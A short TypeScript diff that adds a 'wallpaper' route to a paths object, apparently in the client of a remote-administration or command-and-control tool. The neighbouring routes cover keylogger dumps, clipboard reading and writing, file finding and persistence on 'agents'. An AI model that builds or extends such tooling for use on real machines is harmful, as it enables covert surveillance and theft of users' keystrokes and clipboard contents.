@@ -71,6 +71,7 @@ export const paths = {
     keyloggerDump: (id: string) => `/agents/${id}/keylogger/dump`,
     clipboardGet: (id: string) => `/agents/${id}/clipboard/get`,
     clipboardSet: (id: string) => `/agents/${id}/clipboard/set`,
+    wallpaper: (id: string) => `/agents/${id}/wallpaper`,
     find: (id: string) => `/agents/${id}/find`,
     config: (id: string) => `/agents/${id}/config`,
     persistence: (id: string) => `/agents/${id}/persistence`,
